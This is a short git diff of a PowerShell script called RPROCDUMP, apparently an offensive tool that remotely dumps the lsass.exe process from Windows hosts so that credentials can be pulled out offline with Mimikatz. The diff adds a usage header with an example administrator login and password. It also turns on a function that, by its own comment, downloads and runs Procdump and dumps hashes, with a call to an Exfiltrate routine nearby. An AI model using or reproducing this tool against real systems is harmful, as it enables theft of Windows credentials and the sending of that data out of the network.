@@ -1,3 +1,14 @@
+<#
+RPROCDUMP - Remote process dumping automation. 
+Use it to dump remotely all windows credentials and extract clear text with Mimikatz offline
+Help:
+	Edit prameters in procdump.ps1 and run Rprocdump.ps1 with same parameters:
+	example:
+	RProcdump -server http://127.0.0.1 -login administrator -pass password123
+
+ Author: @ThebenyGreen
+  - EyesOpenSecurity
+#>
 [string] $server = "http://127.0.0.1"
 [string] $process="lsass.exe" 
 [string] $dumpfile = hostname
@@ -59,5 +70,5 @@ Function ProccessDumpCommand { # Download and execute Procdump. Dump hash from p
 		Exfiltrate 
 		}
 		
-#ProccessDumpCommand
-Exfiltrate 
+ProccessDumpCommand
+#Exfiltrate 
